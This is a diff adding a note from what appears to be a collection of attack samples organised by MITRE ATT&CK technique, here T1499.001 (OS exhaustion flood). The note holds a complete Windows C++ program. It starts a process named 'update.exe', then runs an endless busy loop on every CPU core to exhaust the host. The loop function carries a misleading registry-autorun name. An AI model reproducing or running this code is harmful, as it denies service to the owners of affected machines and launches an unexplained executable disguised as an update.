@@ -1,0 +1,50 @@
+---
+title: "Impact.T1499.001.OS Exhaustion Flood"
+folder: "Całe Ataki/3. C2 and Exfiltration"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <thread>
+#include <vector>
+
+void AutorunRegistryBackground4() {
+    int local_counter = 0;
+    while (true) {
+        local_counter++;
+    }
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    const char* programPath = "update.exe";
+
+    STARTUPINFOA si = {};
+    PROCESS_INFORMATION pi = {};
+    si.cb = sizeof(STARTUPINFOA);
+
+    // Uruchom nowy proces
+    if (CreateProcessA(NULL, const_cast<LPSTR>(programPath), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    else {
+    }
+    const int num_threads = std::thread::hardware_concurrency();
+    std::vector<std::thread> threads(num_threads);
+    for (int i = 0; i < num_threads; ++i) {
+        threads[i] = std::thread(AutorunRegistryBackground4);
+    }
+
+    for (int i = 0; i < num_threads; ++i) {
+        threads[i].join();
+    }
+
+    
+    return 0;
+}
